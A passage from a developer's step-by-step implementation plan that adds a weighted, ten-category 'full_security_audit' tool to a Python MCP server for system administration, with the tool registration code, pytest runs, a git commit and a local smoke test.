        "ssh":        {"weight": 15, "findings": _audit_ssh(ssh, server)},
        "firewall":   {"weight": 15, "findings": _audit_firewall(ssh, server)},
        "users":      {"weight": 15, "findings": _audit_users(ssh, server)},
        "network":    {"weight": 10, "findings": _audit_network(ssh, server)},
        "filesystem": {"weight": 10, "findings": _audit_filesystem(ssh, server)},
        "services":   {"weight":  5, "findings": _audit_services(ssh, server)},
        "updates":    {"weight": 10, "findings": _audit_updates(ssh, server)},
        "logs":       {"weight":  5, "findings": _audit_logs(ssh, server)},
        "kernel":     {"weight": 10, "findings": _audit_kernel(ssh, server)},
        "malware":    {"weight":  5, "findings": _audit_malware(ssh, server)},
    }

    scores = _compute_scores(categories)
    report = _format_report(hostname, ip, scores, categories)

    return {
        "score": scores["score"],
        "grade": scores["grade"],
        "summary": scores["summary"],
        "categories": scores["categories"],
        "report_markdown": report,
    }
```

- [ ] **Step 4: Register MCP tool in `server.py`**

In `src/agensysadmin/server.py`, update the import:

```python
from agensysadmin.tools.security import (
    check_updates_impl,
    firewall_status_impl,
    security_audit_impl,
    full_security_audit_impl,
)
```

Add the tool function after the existing `security_audit` tool:

```python
@mcp.tool()
def full_security_audit(server: str) -> dict:
    """Run a comprehensive security audit with scoring: SSH, firewall, users, network, filesystem, services, updates, logs, kernel, malware. Returns score, grade, findings, and markdown report."""
    _ensure_connected(server)
    return full_security_audit_impl(_ssh, server)
```

- [ ] **Step 5: Run full test to verify it passes**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/test_tools_security.py::TestFullSecurityAudit -v`

- [ ] **Step 6: Run ALL tests to make sure nothing is broken**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/ -v`

Expected: All tests pass, including the existing ones.

- [ ] **Step 7: Commit**

```bash
git add src/agensysadmin/tools/security.py src/agensysadmin/server.py tests/test_tools_security.py
git commit -m "feat(security): add full_security_audit MCP tool with 10 categories and scoring"
```

---

### Task 13: Integration Smoke Test

**Files:**
- No code changes — manual verification

- [ ] **Step 1: Start MCP server locally**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m agensysadmin`

Verify it starts without import errors.

- [ ] **Step 2: Run against live server (optional)**

After restarting Claude Code, call:
```
full_security_audit(server="server2")
```

Verify the response includes all 10 categories, a score, grade, and a markdown report.

- [ ] **Step 3: Commit any fixes if needed**

If smoke testing reveals issues, fix and commit.
